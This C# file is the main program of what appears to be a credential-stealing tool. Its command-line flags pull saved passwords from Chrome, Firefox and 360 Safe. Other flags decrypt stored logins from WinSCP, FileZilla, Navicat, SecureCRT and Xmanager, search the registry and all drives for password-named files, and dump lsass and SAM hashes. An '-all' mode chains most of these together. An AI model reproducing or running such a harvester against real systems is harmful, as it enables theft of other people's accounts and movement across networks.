using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using SharpXDecrypt;
using Chrome;
using Firefox;
using Safe360pwd;

namespace decrypt
{
    class program
    {
        private static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: " + Process.GetCurrentProcess().ProcessName + ".exe -all");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -browser [-chrome] [-firefox] [-360safe]");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -winscp");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -filezilla");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -navicat");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -securecrt");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -xmanager [-path \"sessions path\"]");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -searchreg");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -searchfile");
                Console.WriteLine("       " + Process.GetCurrentProcess().ProcessName + ".exe -systemhash");
            }

            if (args.Length == 1 && args[0] == "-browser")
            {
                Console.WriteLine("========== Chromepwd ==========");
                Console.WriteLine("");
                ChromePwd chromePwd = new ChromePwd();
                chromePwd.Run();
                Console.WriteLine("========== Firefoxpwd ==========");
                FirefoxPwd firefoxPwd = new FirefoxPwd();
                FirefoxPwd.GetLogins();
            }
            if (args.Length == 2 && args[0] == "-browser" && args[1] == "-chrome")
            {
                Console.WriteLine("========== Chromepwd ==========");
                Console.WriteLine("");
                ChromePwd chromePwd = new ChromePwd();
                chromePwd.Run();
            }
            if (args.Length == 2 && args[0] == "-browser" && args[1] == "-firefox")
            {
                Console.WriteLine("========== Firefoxpwd ==========");
                Console.WriteLine("");
                FirefoxPwd firefoxPwd = new FirefoxPwd();
                FirefoxPwd.GetLogins();
            }
            if (args.Length == 2 && args[0] == "-browser" && args[1] == "-360safe")
            {
                Console.WriteLine("========== 360safepwd ==========");
                Console.WriteLine("");

                get360safepass.Run();
            }

            if (args.Length == 1 && args[0] == "-winscp")
            {
                WinSCP winSCP = new WinSCP();
                WinSCP.WinSCPCrypto();
            }
            if (args.Length == 1 && args[0] == "-filezilla")
            {
                Console.WriteLine("");
                Console.WriteLine("========== FileZillapwd ==========");
                Console.WriteLine("");
                fileZilla fileZilla = new fileZilla();
                fileZilla.FileZillaCrypt();
            }
            if (args.Length == 1 && args[0] == "-navicat")
            {
                Console.WriteLine("");
                Console.WriteLine("========== Navicatpwd ==========");
                Console.WriteLine("");
                NavicatPwd NavicatPwd = new NavicatPwd();
                NavicatPwd.NavicatCrypt();
            }
            if (args.Length == 1 && args[0] == "-securecrt")
            {
                Console.WriteLine("");
                Console.WriteLine("========== SecureCrt ==========");
                Console.WriteLine("");
                global::SecureCrtPwd.SecureCrtCrypt();
            }

            if (args.Length == 3 && args[0] == "-xmanager" && args[1] == "-path")
            {
                Console.WriteLine("");
                Console.WriteLine("========== Xmanager ==========");
                Console.WriteLine("");
                string xshPath = args[2];
                XClass2.Decrypt(xshPath);
            }

            if (args.Length == 1 && args[0] == "-xmanager")
            {
                Console.WriteLine("");
                Console.WriteLine("========== Xmanager ==========");
                Console.WriteLine("");
                XClass.Decrypt();
            }

            if (args.Length == 1 && args[0] == "-searchreg")
            {
                Console.WriteLine("");
                Console.WriteLine("========== Search password in Registry ==========");
                Console.WriteLine("");
                SearchKey searchKey = new SearchKey();
                searchKey.run();
            }
            if (args.Length == 1 && args[0] == "-searchfile")
            {
                Console.WriteLine("");
                Console.WriteLine("========== Search password in files ==========");
                Console.WriteLine("");
                SearchFile SearchFile = new SearchFile();
                String[] drives = Environment.GetLogicalDrives();
                string[] strings = { "*密码*", "*pass*", "*帐号*"};
                foreach (string drive in drives)
                {
                    foreach (string str in strings)
                    {
                        SearchFile.run(str, drive);
                    }
                }
                //SearchFile.run("*password*","c:\\");
                //SearchFile.run("*password*", "d:\\");
            }

            if (args.Length == 1 && args[0] == "-systemhash")
            {
                Console.WriteLine("");
                Console.WriteLine("========== Dump lsass and SAM ==========");
                Console.WriteLine("");
                dumphash dump = new dumphash();
                dumphash.dump();
            }

            if (args.Length == 1 && args[0] == "-all")
            {
                Console.WriteLine("========== Chromepwd ==========");
                Console.WriteLine("");
                ChromePwd chromePwd = new ChromePwd();
                chromePwd.Run();

                Console.WriteLine("========== Firefoxpwd ==========");
                FirefoxPwd firefoxPwd = new FirefoxPwd();
                FirefoxPwd.GetLogins();

                WinSCP winSCP = new WinSCP();
                WinSCP.WinSCPCrypto();

                Console.WriteLine("========== 360safepwd ==========");
                Console.WriteLine("");
                get360safepass.Run();

                Console.WriteLine("");
                Console.WriteLine("========== FileZillapwd ==========");
                Console.WriteLine("");
                fileZilla fileZilla = new fileZilla();
                fileZilla.FileZillaCrypt();

                Console.WriteLine("");
                Console.WriteLine("========== Navicatpwd ==========");
                Console.WriteLine("");
                NavicatPwd NavicatPwd = new NavicatPwd();
                NavicatPwd.NavicatCrypt();

                Console.WriteLine("");
                Console.WriteLine("========== SecureCrt ==========");
                Console.WriteLine("");
                global::SecureCrtPwd.SecureCrtCrypt();

                Console.WriteLine("");
                Console.WriteLine("========== Xmanager ==========");
                Console.WriteLine("");
                XClass.Decrypt();

                Console.WriteLine("");
                Console.WriteLine("========== Search password in Registry ==========");
                Console.WriteLine("");
                SearchKey searchKey = new SearchKey();
                searchKey.run();
                /*
                Console.WriteLine("");
                Console.WriteLine("========== Dump lsass and SAM ==========");
                Console.WriteLine("");
                dumphash dump = new dumphash();
                dumphash.dump();
                */


            }
        }
    }
}
